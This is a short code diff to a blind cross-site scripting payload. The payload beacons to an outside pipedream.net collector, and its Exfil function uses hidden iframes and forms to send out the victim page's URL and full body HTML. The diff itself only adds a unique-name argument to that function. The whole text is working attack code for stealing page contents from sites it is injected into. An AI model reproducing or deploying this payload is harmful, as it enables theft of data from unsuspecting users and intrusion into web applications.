@@ -4,10 +4,10 @@ elem.src = 'https://encq9kzbey4y.x.pipedream.net/BLIND_XSS_TRIGGERED';
 document.body.appendChild(elem);
   
   //https://stackoverflow.com/a/6169703
-  function Exfil(f) {
+  function Exfil(f, n) {
   // Add the iframe with a unique name
   var iframe = document.createElement("iframe");
-  var uniqueString = "CHANGE_THIS_TO_SOME_UNIQUE_STRING";
+  var uniqueString = n;
   document.body.appendChild(iframe);
   iframe.style.display = "none";
   iframe.contentWindow.name = uniqueString;
@@ -29,7 +29,7 @@ document.body.appendChild(elem);
   input.name = "location";
   input.value = document.location.href;
   form.appendChild(input);
-  });
+  }, "xfil1");
   
   Exfil(function(form){
    var input = document.createElement("input");
@@ -37,7 +37,7 @@ document.body.appendChild(elem);
   input.name = "html_code";
   input.value = document.body.innerHTML;
   form.appendChild(input);
-  });
+  }, "xfil2");
   
 }catch(error) {  
 }
